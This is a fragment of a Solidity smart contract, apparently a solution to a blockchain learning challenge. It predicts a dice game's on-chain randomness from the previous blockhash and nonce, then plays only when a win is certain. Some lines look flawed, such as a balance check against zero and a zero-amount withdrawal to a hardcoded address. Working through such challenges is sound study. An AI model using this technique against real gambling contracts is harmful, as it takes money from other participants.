...
contract RiggedRoll is Ownable {
    ...
    function withdraw(address to, uint256 amount) public onlyOwner {
        ...
        require(address(this).balance >= 0 ether, "Nothing to withdraw");
    ...
    function riggedRoll() public onlyOwner {
        require(address(this).balance >= .002 ether, "Not enough ETH to roll the dice");
        bytes32 prevHash = blockhash(block.number - 1);
        console.log("nonce() is ", diceGame.nonce());
        console.log("address this: ", address(diceGame));

        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        if(roll < 3){
            diceGame.rollTheDice{value: .002 ether}();
            withdraw(address(0x5aA06E39B5C5d031C1aEBcD84E880e18f8E7247e), 0);
        }
    }
